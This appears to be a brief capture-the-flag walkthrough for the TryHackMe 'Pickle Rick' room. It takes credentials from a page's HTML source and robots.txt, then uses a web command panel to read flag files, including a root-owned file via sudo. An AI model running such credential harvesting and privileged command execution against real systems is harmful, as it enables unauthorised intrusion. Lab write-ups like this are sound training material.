
# pickle rick
you get an ip address (10.10.209.99) with the instructions to find 3 ingredients/ flags <br>
https://tryhackme.com/room/picklerick


# solution 
1. its an webserver with an login page under <ip>/login.php
2. the user is found in the main html source code, the password is found in <ip>/robots.txt
3. the input field is an linux shell:
```
# first ingredient:
less/ tac Sup3rS3cretPickl3Ingred.txt

# 2nd ingredient:
less/ tac /home/rick/second\ ingredients

# 3nd ingredient:
sudo tac /root/3rd.txt
```
